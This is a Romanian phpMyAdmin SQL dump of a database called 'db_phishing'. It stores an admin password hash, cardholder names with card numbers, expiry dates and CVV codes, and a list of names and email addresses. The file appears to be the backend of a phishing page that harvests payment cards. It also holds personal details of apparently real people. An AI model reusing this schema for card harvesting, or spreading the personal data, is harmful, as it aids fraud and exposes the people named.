-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Gazdă: 127.0.0.1
-- Timp de generare: mai 15, 2023 la 03:24 PM
-- Versiune server: 10.4.28-MariaDB
-- Versiune PHP: 8.2.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Bază de date: `db_phishing`
--

-- --------------------------------------------------------

--
-- Structură tabel pentru tabel `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Eliminarea datelor din tabel `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'admin', '$2y$10$F3vn/uLahE4z/zxvqJH4meJr1/mcKJu9WUB30ael.OgX5LgUzZwKK');

-- --------------------------------------------------------

--
-- Structură tabel pentru tabel `cards`
--

CREATE TABLE `cards` (
  `id` int(11) NOT NULL,
  `numeCard` varchar(255) NOT NULL,
  `numarCard` varchar(255) NOT NULL,
  `expirareCard` date NOT NULL,
  `cvvCard` int(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Eliminarea datelor din tabel `cards`
--

INSERT INTO `cards` (`id`, `numeCard`, `numarCard`, `expirareCard`, `cvvCard`) VALUES
(1, 'Marian Cernea', '8736983578279286', '2023-11-01', 353),
(2, 'Dorogea Eduard Gabriel', '8397839642576354', '2028-06-01', 598);

-- --------------------------------------------------------

--
-- Structură tabel pentru tabel `user`
--

CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `nume` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Eliminarea datelor din tabel `user`
--

INSERT INTO `user` (`id`, `nume`, `email`) VALUES
(1, 'Nicolaescu Ovidiu', 'test@gmail.com'),
(2, 'Nicolaescu Ovidiu', 'test@gmail.com'),
(3, 'awdwd', 'awda@gmail.com'),
(4, 'awdwd', 'awda@gmail.com'),
(5, 'awdwd', 'awda@gmail.com'),
(6, 'Marian Cernea', 'maricool112@gmail.com'),
(7, 'Dorogea Eduard', 'gupia27@gmail.com'),
(8, 'awdawd', 'awdawd@gmail.com'),
(9, 'dorel sandu', 'awdawd@gmail.com');

--
-- Indexuri pentru tabele eliminate
--

--
-- Indexuri pentru tabele `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexuri pentru tabele `cards`
--
ALTER TABLE `cards`
  ADD PRIMARY KEY (`id`);

--
-- Indexuri pentru tabele `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pentru tabele eliminate
--

--
-- AUTO_INCREMENT pentru tabele `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT pentru tabele `cards`
--
ALTER TABLE `cards`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT pentru tabele `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
